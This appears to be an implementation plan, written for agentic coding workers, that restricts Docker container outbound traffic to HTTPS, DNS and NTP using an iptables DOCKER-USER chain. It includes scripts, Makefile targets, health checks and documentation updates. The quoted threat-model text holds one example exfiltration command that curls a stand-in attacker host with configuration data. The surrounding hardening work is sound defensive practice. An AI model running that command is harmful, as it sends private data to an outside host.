# Egress Control Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Restrict outbound network access from Docker containers to HTTPS, DNS, and NTP — closing Gap 1 in `docs/threat-model.md` and blocking cleartext exfiltration from a compromised container.

**Architecture:** Add a standalone `scripts/egress.sh` that creates an `OPENCLAW_EGRESS` iptables chain and hooks it into Docker's `DOCKER-USER` forwarding chain, scoped to traffic leaving via the external interface only (so container-to-container traffic on internal bridges is unaffected). The script installs `iptables-persistent` for reboot survival and is idempotent. Wire it into the deploy flow (`provision.sh`, `setup.sh`, new `make setup-egress` target) and add a `make doctor` check.

**Tech Stack:** bash, iptables, iptables-persistent (Ubuntu apt package), UFW (already installed)

---

## File Map

| File | Change |
|---|---|
| `scripts/egress.sh` | Create: DOCKER-USER egress chain, allowlist, persistence |
| `scripts/provision.sh` | Add iptables-persistent install + call egress.sh at end |
| `scripts/setup.sh` | Apply egress rules after provisioning step |
| `Makefile` | Add `setup-egress` target |
| `scripts/doctor.sh` | New "Egress" section: check chain existence + DOCKER-USER hook |
| `docs/runbook.md` | New Section 13: Egress control (setup, verify, disable) |
| `docs/threat-model.md` | Update Gap 1 status: open → resolved in Phase 1.5 |

---

## Task 1: `scripts/egress.sh`

**Files:**
- Create: `scripts/egress.sh`

### Why UFW Won't Work for Docker

The existing commented-out block in `provision.sh` uses `ufw default deny outgoing`. UFW's outgoing deny sets the iptables `OUTPUT` chain policy — this applies to traffic originating from the **host** itself, not to Docker container traffic. Container traffic is routed through the iptables `FORWARD` chain. UFW does not control the `FORWARD` chain.

Docker creates the `DOCKER-USER` chain specifically for user-defined rules on forwarded traffic. Any rule in `DOCKER-USER` is evaluated before Docker's own rules.

### Why Scope to the External Interface

The `DOCKER-USER` chain sees ALL forwarded traffic, including container-to-container traffic (e.g., `openclaw` → `redis`, `calendar-proxy` → `redis`). If you put a DROP rule without interface scoping, you'll block internal communication and break the stack.

Adding `-o <external_if>` to the DOCKER-USER jump rule limits the egress policy to traffic leaving through the external NIC (internet-bound). Container-to-container traffic on Docker bridge networks uses the bridge interface, not the external interface — it is unaffected.

- [ ] **Step 1: Create `scripts/egress.sh`**

```bash
#!/usr/bin/env bash
# Apply container egress allowlist via DOCKER-USER iptables chain.
#
# Restricts Docker container outbound traffic to:
#   - HTTPS (tcp/443)    — all required APIs (Anthropic, Telegram, OpenAI, etc.)
#   - DNS   (udp+tcp/53) — name resolution
#   - NTP   (udp/123)    — time sync
#   - ESTABLISHED/RELATED — return traffic for existing connections
#
# Does NOT affect container-to-container traffic on Docker bridge networks.
# Safe to run multiple times — idempotent.
#
# Usage: sudo bash scripts/egress.sh
set -euo pipefail

echo "[egress] Applying container egress allowlist..."

# ── Detect external interface ──────────────────────────────────────────────────
EXTERNAL_IF=$(ip route | awk '/^default/ {print $5; exit}')
if [ -z "$EXTERNAL_IF" ]; then
    echo "[egress] ERROR: Cannot detect external interface (no default route?)."
    exit 1
fi
echo "[egress] External interface: $EXTERNAL_IF"

# ── Require Docker to be running (DOCKER-USER chain must exist) ───────────────
if ! iptables -L DOCKER-USER -n &>/dev/null; then
    echo "[egress] ERROR: DOCKER-USER chain not found — is Docker running?"
    echo "[egress] Start Docker first: sudo systemctl start docker"
    exit 1
fi

# ── Install iptables-persistent if missing ────────────────────────────────────
if ! dpkg -l iptables-persistent 2>/dev/null | grep -q '^ii'; then
    echo "[egress] Installing iptables-persistent..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -q iptables-persistent
fi

# ── Create/flush OPENCLAW_EGRESS chain (idempotent) ───────────────────────────
iptables -N OPENCLAW_EGRESS 2>/dev/null || true
iptables -F OPENCLAW_EGRESS

# ── Egress allowlist rules ────────────────────────────────────────────────────
# Return traffic for connections already established (must come first)
iptables -A OPENCLAW_EGRESS -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# DNS (UDP + TCP for large responses)
iptables -A OPENCLAW_EGRESS -p udp --dport 53 -j ACCEPT
iptables -A OPENCLAW_EGRESS -p tcp --dport 53 -j ACCEPT

# NTP (time sync)
iptables -A OPENCLAW_EGRESS -p udp --dport 123 -j ACCEPT

# HTTPS — covers all required external APIs
iptables -A OPENCLAW_EGRESS -p tcp --dport 443 -j ACCEPT

# Drop everything else (cleartext HTTP, raw TCP/UDP to arbitrary hosts, etc.)
iptables -A OPENCLAW_EGRESS -j DROP

# ── Hook into DOCKER-USER ─────────────────────────────────────────────────────
# -o "$EXTERNAL_IF" scopes the policy to internet-bound traffic only.
# Container-to-container traffic (openclaw→redis, etc.) is unaffected.
if ! iptables -C DOCKER-USER -o "$EXTERNAL_IF" -j OPENCLAW_EGRESS 2>/dev/null; then
    iptables -I DOCKER-USER 1 -o "$EXTERNAL_IF" -j OPENCLAW_EGRESS
    echo "[egress] Hooked OPENCLAW_EGRESS into DOCKER-USER (out=$EXTERNAL_IF)"
else
    echo "[egress] DOCKER-USER already has OPENCLAW_EGRESS hook"
fi

# ── Persist rules (survives reboot) ──────────────────────────────────────────
netfilter-persistent save
echo "[egress] Rules saved to /etc/iptables/rules.v4"

echo "[egress] Done. Container egress restricted to HTTPS(443), DNS(53), NTP(123)."
```

- [ ] **Step 2: Make executable and verify it works on the VPS**

Copy and run it on the VPS (requires Docker to be running):

```bash
# From local machine:
scp scripts/egress.sh user@YOUR_VPS_IP:/tmp/egress.sh
ssh user@YOUR_VPS_IP "sudo bash /tmp/egress.sh"
```

Expected output:
```
[egress] External interface: eth0
[egress] Installing iptables-persistent...   (only on first run)
[egress] Hooked OPENCLAW_EGRESS into DOCKER-USER (out=eth0)
[egress] Rules saved to /etc/iptables/rules.v4
[egress] Done. Container egress restricted to HTTPS(443), DNS(53), NTP(123).
```

- [ ] **Step 3: Verify the iptables state**

On VPS (`ssh user@YOUR_VPS_IP`):

```bash
# 1. Chain contents — should show ESTABLISHED, DNS, NTP, HTTPS, DROP rules:
sudo iptables -L OPENCLAW_EGRESS -n --line-numbers

# Expected output:
# Chain OPENCLAW_EGRESS (1 references)
# num  target     prot opt source   destination
# 1    ACCEPT     all  --  0.0.0.0/0  0.0.0.0/0  ctstate RELATED,ESTABLISHED
# 2    ACCEPT     udp  --  0.0.0.0/0  0.0.0.0/0  udp dpt:53
# 3    ACCEPT     tcp  --  0.0.0.0/0  0.0.0.0/0  tcp dpt:53
# 4    ACCEPT     udp  --  0.0.0.0/0  0.0.0.0/0  udp dpt:123
# 5    ACCEPT     tcp  --  0.0.0.0/0  0.0.0.0/0  tcp dpt:443
# 6    DROP       all  --  0.0.0.0/0  0.0.0.0/0

# 2. DOCKER-USER hook — should show OPENCLAW_EGRESS at position 1:
sudo iptables -L DOCKER-USER -n --line-numbers | head -5

# Expected:
# 1    OPENCLAW_EGRESS  all  --  0.0.0.0/0  0.0.0.0/0   out=eth0
```

- [ ] **Step 4: Verify stack is still healthy (no container-to-container breakage)**

```bash
# On VPS:
cd ~/openclaw-deploy
sudo docker compose ps
# All services should still show "healthy"

# Redis reachable from openclaw:
sudo docker compose exec openclaw sh -c "nc -zw2 redis 6379 && echo 'redis OK'"

# Anthropic API reachable (port 443):
sudo docker compose exec openclaw sh -c "nc -zw5 api.anthropic.com 443 && echo 'anthropic OK'"

# Port 80 (cleartext HTTP) should be blocked:
sudo docker compose exec openclaw sh -c "nc -zw3 example.com 80 && echo 'port 80 open' || echo 'port 80 BLOCKED (expected)'"
```

- [ ] **Step 5: Commit**

```bash
git add scripts/egress.sh
git commit -m "feat: add container egress allowlist (DOCKER-USER iptables chain)

Restricts Docker container outbound to HTTPS(443), DNS(53), NTP(123).
Uses DOCKER-USER chain scoped to external interface — container-to-container
traffic on Docker bridge networks is unaffected. Closes Gap 1 (threat-model.md).
Idempotent, installs iptables-persistent for reboot survival."
```

---

## Task 2: Wire egress into deploy flow

**Files:**
- Modify: `scripts/provision.sh` (lines 46–56 — replace commented UFW outbound block)
- Modify: `scripts/setup.sh` (after step 2, before step 3)
- Modify: `Makefile`

This task wires `egress.sh` into:
1. Fresh deploys (via `provision.sh` for brand-new VPSes)
2. The new `make setup-egress` target (for existing VPSes and manual re-application)

The existing commented-out UFW outbound block in `provision.sh` (lines 46–56) is replaced with a call to `egress.sh`. Note: `provision.sh` is only run on first-time VPSes without Docker. Existing VPSes use `make setup-egress`.

`setup.sh` also gets a step after provisioning to apply egress on fresh deploys (where `provision.sh` was run by step 2).

- [ ] **Step 1: Update `provision.sh` — replace commented UFW block with egress.sh call**

Remove lines 46–56 (the commented-out outbound allowlist block) and replace with:

```bash
# ── Container egress allowlist ────────────────────────────────────────────────
# Restricts Docker container outbound to HTTPS(443), DNS(53), NTP(123).
# Requires Docker daemon to be running (DOCKER-USER chain must exist).
if command -v docker &>/dev/null; then
  # Explicitly start daemon before calling egress.sh — the binary may be
  # available while the daemon has not started yet (race after fresh install).
  systemctl start docker
  bash "$(dirname "$0")/egress.sh"
else
  echo "[provision] Skipping egress rules — Docker not installed. Run: sudo bash scripts/egress.sh"
fi
```

The full replacement diff (old lines 46–56, new block):

Old:
```bash
# ── Optional outbound allowlist (DISABLED by default) ────────────────────────
# Uncomment and customize to restrict outbound traffic after verifying
# that all required API endpoints are listed.
#
# ufw default deny outgoing
# ufw allow out 53/udp   comment "DNS"
# ufw allow out 123/udp  comment "NTP"
# ufw allow out to any port 443 comment "HTTPS outbound"
# # Add specific IPs for Telegram, Anthropic, OpenAI, WhatsApp as needed
# ufw reload
echo "[provision] Outbound egress: unrestricted (Phase 1). See docs/threat-model.md."
```

New (replace the entire old block):
```bash
# ── Container egress allowlist ────────────────────────────────────────────────
# Restricts Docker container outbound to HTTPS(443), DNS(53), NTP(123).
# Requires Docker daemon to be running (DOCKER-USER chain must exist).
if command -v docker &>/dev/null; then
  # Explicitly start daemon — the Docker installer leaves the binary available
  # but the daemon may not have started yet, and DOCKER-USER only exists once
  # the daemon is running.
  systemctl start docker
  bash "$(dirname "$0")/egress.sh"
else
  echo "[provision] Skipping egress rules — Docker not installed. Run: sudo bash scripts/egress.sh"
fi
```

- [ ] **Step 2: Update `setup.sh` — apply egress after provisioning step**

In `setup.sh`, after the provisioning block (step 2, around line 34 — after `ok "Provision complete"`), add an egress application step:

```bash
# ── Step 2b: Apply container egress allowlist ─────────────────────────────────
step "Applying container egress allowlist"
if scp scripts/egress.sh "$HOST:/tmp/egress.sh" && rsh "sudo bash /tmp/egress.sh"; then
    ok "Egress allowlist active (HTTPS/DNS/NTP only)"
else
    warn "Egress setup failed — run: make setup-egress"
fi
```

Place this immediately after the closing `}` of the Docker install block (after `ok "Docker available"` line, before the git check).

Full placement context in `setup.sh`:

```bash
rsh "command -v docker > /dev/null 2>&1" || {
    warn "Docker not found — running provision.sh"
    # Copy provision.sh and run it
    scp scripts/provision.sh "$HOST:/tmp/provision.sh"
    rsh "sudo bash /tmp/provision.sh"
    ok "Provision complete"
}
ok "Docker available"

# ── Step 2b: Apply container egress allowlist ─────────────────────────────────
step "Applying container egress allowlist"
if scp scripts/egress.sh "$HOST:/tmp/egress.sh" && rsh "sudo bash /tmp/egress.sh"; then
    ok "Egress allowlist active (HTTPS/DNS/NTP only)"
else
    warn "Egress setup failed — run: make setup-egress"
fi
```

**Why `if scp ... && rsh ...; then ... else ... fi` rather than `scp ... && rsh ... || warn ...`:**
`set -euo pipefail` means a bare `scp` failure would abort the entire `setup.sh` before the `|| warn` is reached. Wrapping both commands in a single `if` block means any failure (scp or rsh) routes to `warn` and setup continues.

- [ ] **Step 3: Add `setup-egress` target to `Makefile`**

Add after the existing `setup-approvals` target (around line 85):

```makefile
# Apply container egress allowlist on VPS (run once after deploy, or to re-apply)
setup-egress:
	@[ -n "$(HOST)" ] || (echo "Run 'make deploy HOST=user@x.x.x.x' first, or set HOST=" && exit 1)
	@scp scripts/egress.sh "$(HOST):/tmp/egress.sh"
	@ssh "$(HOST)" "sudo bash /tmp/egress.sh"
```

Also update the `.PHONY` line at the top of the Makefile to include `setup-egress`:

```makefile
.PHONY: up up-calendar up-voice down logs logs-all restart status backup backup-remote update test kill-switch setup-approvals setup-egress deploy-workspace deploy doctor pair-whatsapp
```

- [ ] **Step 4: Apply egress to the existing live VPS**

```bash
# From local machine:
make setup-egress
```

Expected: `[egress] Done. Container egress restricted to HTTPS(443), DNS(53), NTP(123).`

- [ ] **Step 5: Run make doctor (stack still healthy)**

```bash
make doctor
# All services should still show healthy — no regressions
```

- [ ] **Step 6: Commit**

```bash
git add scripts/provision.sh scripts/setup.sh Makefile
git commit -m "feat: wire egress.sh into deploy flow (provision, setup, make setup-egress)"
```

---

## Task 3: Doctor check

**Files:**
- Modify: `scripts/doctor.sh`

Add a new "Egress" section after the "System" section that checks:
1. Whether the `OPENCLAW_EGRESS` chain exists in iptables
2. Whether `DOCKER-USER` has a jump to it

- [ ] **Step 1: Add "Egress" section to `scripts/doctor.sh`**

Insert after the System section (after the `NODE_OPTIONS` check, before the summary block `# ── Summary`):

```bash
# ── Egress ─────────────────────────────────────────────────────────────────────

echo ""
echo " Egress"

if sudo iptables -L OPENCLAW_EGRESS -n &>/dev/null; then
    if sudo iptables -L DOCKER-USER -n 2>/dev/null | grep -q "OPENCLAW_EGRESS"; then
        pass "Egress allowlist  active (HTTPS/DNS/NTP only)"
    else
        warn "Egress chain exists but not hooked into DOCKER-USER — run: make setup-egress"
    fi
else
    warn "Egress allowlist  not configured — run: make setup-egress"
fi
```

- [ ] **Step 2: Run make doctor to verify the new section appears**

```bash
make doctor
```

Expected new section in output:
```
 Egress
 ✅ Egress allowlist  active (HTTPS/DNS/NTP only)
```

(Shows ⚠️ if egress.sh hasn't been run yet — that's correct.)

- [ ] **Step 3: Commit**

```bash
git add scripts/doctor.sh
git commit -m "feat: add egress allowlist check to make doctor"
```

---

## Task 4: Documentation

**Files:**
- Modify: `docs/runbook.md` (add Section 13)
- Modify: `docs/threat-model.md` (close Gap 1)

- [ ] **Step 1: Add Section 13 to `docs/runbook.md`**

Append after the end of the existing content (after Section 12):

```markdown
---

## 13. Egress Control

Docker containers are restricted to outbound HTTPS (443), DNS (53), and NTP (123) only. This prevents cleartext data exfiltration from a compromised container. Implemented via the `OPENCLAW_EGRESS` iptables chain, hooked into Docker's `DOCKER-USER` forwarding chain.

### First-time setup (existing VPS)

```bash
make setup-egress
make doctor    # confirm "Egress allowlist active"
```

### Verify rules are active

```bash
# On VPS:
sudo iptables -L OPENCLAW_EGRESS -n --line-numbers
sudo iptables -L DOCKER-USER -n | head -5
```

Expected: OPENCLAW_EGRESS shows ESTABLISHED, DNS(53), NTP(123), HTTPS(443), DROP rules. DOCKER-USER shows OPENCLAW_EGRESS at position 1.

### Verify connectivity (on VPS)

```bash
# Port 443 must work (Anthropic, Telegram, etc.):
docker compose exec openclaw sh -c "nc -zw5 api.anthropic.com 443 && echo OK"

# Port 80 must be blocked (cleartext exfiltration):
docker compose exec openclaw sh -c "nc -zw3 example.com 80 && echo OPEN || echo BLOCKED"
# Expected: BLOCKED
```

### Rules don't survive reboot?

`egress.sh` installs `iptables-persistent` and calls `netfilter-persistent save`. If rules are lost after reboot, re-apply manually and save again:

```bash
make setup-egress    # from local machine
# OR on VPS directly:
sudo bash scripts/egress.sh
```

### Disable egress control (for debugging)

```bash
# On VPS:
sudo iptables -D DOCKER-USER -o $(ip route | awk '/^default/ {print $5; exit}') -j OPENCLAW_EGRESS
# Re-enable: make setup-egress
```

### Allowed outbound endpoints

All external APIs use HTTPS (443), which is allowed:

| Service | Endpoint | Port |
|---|---|---|
| Anthropic | `api.anthropic.com` | 443 |
| Telegram | `api.telegram.org` | 443 |
| OpenAI (voice) | `api.openai.com` | 443 |
| Brave Search | `api.search.brave.com` | 443 |
| Google Calendar | `accounts.google.com`, `www.googleapis.com` | 443 |
| Hetzner S3 | `hel1.your-objectstorage.com` | 443 |
| Let's Encrypt | `acme-v02.api.letsencrypt.org` | 443 |

All of these work through the HTTPS-only allowlist with no IP pinning required.
```

- [ ] **Step 2: Update `docs/threat-model.md` Gap 1**

Replace the Gap 1 section. Find:

```markdown
### Gap 1 — Outbound Egress Unrestricted (Phase 1)

Docker allows all outbound traffic by default. A compromised OpenClaw container can exfiltrate data to arbitrary hosts — for example: `curl evil.com/exfil?data=$(cat /data/config)`. Phase 1 ships with outbound unrestricted and documents this explicitly. A commented UFW outbound block is included in `scripts/provision.sh` for Phase 1.5 enablement. Uncommenting it restricts outbound to known API endpoints (Telegram, WhatsApp/Meta, Anthropic, OpenAI, NTP, DNS).

**Risk:** High if container is compromised. Low if container is not compromised (which is the expected operating condition).

**Mitigation in Phase 1.5:** Enable the commented egress allowlist in `provision.sh`.
```

Replace with:

```markdown
### Gap 1 — Outbound Egress (Resolved in Phase 1.5)

Container outbound is restricted to HTTPS (443), DNS (53), and NTP (123) via the `OPENCLAW_EGRESS` iptables chain, hooked into Docker's `DOCKER-USER` forwarding chain. Cleartext HTTP, raw TCP to arbitrary hosts, and custom ports are blocked.

A compromised container can still reach HTTPS endpoints. It cannot exfiltrate data over cleartext HTTP or arbitrary protocols. The blast radius of a compromise is reduced to services reachable via HTTPS.

**Setup:** `make setup-egress` (run once after deploy, or automatically on fresh deploys via `provision.sh`). See `docs/runbook.md` Section 13.

**Residual risk:** A compromised container can exfiltrate data to any HTTPS endpoint. IP-level allowlisting (pinning to Anthropic/Telegram/etc. CIDR ranges) would close this further but requires ongoing maintenance as CDN IPs change and is not implemented.
```

- [ ] **Step 3: Run make doctor to confirm**

```bash
make doctor
# Should show green Egress section
```

- [ ] **Step 4: Commit**

```bash
git add docs/runbook.md docs/threat-model.md
git commit -m "docs: add egress control runbook section, close Gap 1 in threat model"
```

---

## Final verification

After all tasks are done, on the VPS confirm:

```bash
# 1. Chain is active
sudo iptables -L OPENCLAW_EGRESS -n --line-numbers
# Expect: ESTABLISHED, DNS, NTP, HTTPS, DROP rules

# 2. DOCKER-USER hook is present
sudo iptables -L DOCKER-USER -n | head -3
# Expect: OPENCLAW_EGRESS at position 1

# 3. Stack is healthy
make doctor
# Expect: all green, including "Egress allowlist  active"

# 4. Allowed traffic works
docker compose exec openclaw sh -c "nc -zw5 api.anthropic.com 443 && echo 'HTTPS OK'"
docker compose exec openclaw sh -c "nc -zw5 redis 6379 && echo 'Redis OK'"

# 5. Blocked traffic is blocked
docker compose exec openclaw sh -c "nc -zw3 example.com 80 && echo 'OPEN' || echo 'BLOCKED'"
# Expect: BLOCKED
```
